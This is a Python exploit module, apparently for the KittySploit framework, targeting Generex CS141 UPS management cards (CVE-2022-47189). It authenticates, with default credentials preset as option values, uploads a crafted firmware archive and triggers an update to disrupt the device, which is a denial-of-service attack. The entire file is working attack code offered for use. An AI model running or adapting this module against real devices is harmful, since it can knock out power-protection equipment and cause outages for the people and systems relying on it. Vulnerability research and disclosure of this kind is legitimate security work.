import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.cs141 import CS141


class Module(Auxiliary, Http_client, CS141):
    __info__ = {
        "name": "Generex CS141 CVE-2022-47189 - DoS via Firmware Upload",
        "description": (
            "Generex UPS CS141 below 2.06 accepts a crafted firmware archive that can disrupt the "
            "device functionality after the update process."
        ),
        "author": ["JoelGMSec", "KittySploit Team"],
        "cve": "CVE-2022-47189",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-47189",
            "https://www.incibe-cert.es/en/early-warning/ics-advisories/update-03032023-multiple-vulnerabilities-generex-ups-cs141",
        ],
        "tags": ["cs141", "firmware", "dos"],
    }

    username = OptString("admin", "CS141 username", required=True)
    password = OptString("cs141-snmp", "CS141 password", required=True)
    firmware_path = OptString("", "Local path to the crafted firmware archive", required=True)
    wait_seconds = OptInteger(30, "Seconds to wait after triggering the update", required=False)

    def check(self):
        auth_ctx = self.cs141_get_auth_context(self.username, self.password, True)
        if auth_ctx and (auth_ctx.get("ok") or auth_ctx.get("used_default_credentials")):
            return {"vulnerable": True, "reason": "Authenticated firmware workflow is reachable", "confidence": "medium"}
        return {"vulnerable": False, "reason": "Authentication failed", "confidence": "low"}

    def run(self):
        auth_ctx = self.cs141_get_auth_context(self.username, self.password, True)
        if not auth_ctx:
            print_error("Authentication failed")
            return False

        try:
            firmware_bytes = open(self.firmware_path, "rb").read()
        except Exception as e:
            print_error(f"Unable to read firmware file: {e}")
            return False

        response = self.cs141_upload_firmware(firmware_bytes, auth_ctx)
        if not response or not getattr(response, "ok", False):
            print_error("Firmware upload failed")
            return False

        self.cs141_trigger_update(auth_ctx)
        print_success("Firmware archive uploaded and update trigger requested")
        print_warning(f"Waiting {self.wait_seconds} second(s); device functionality may be disrupted afterward")
        time.sleep(int(self.wait_seconds))
        return True
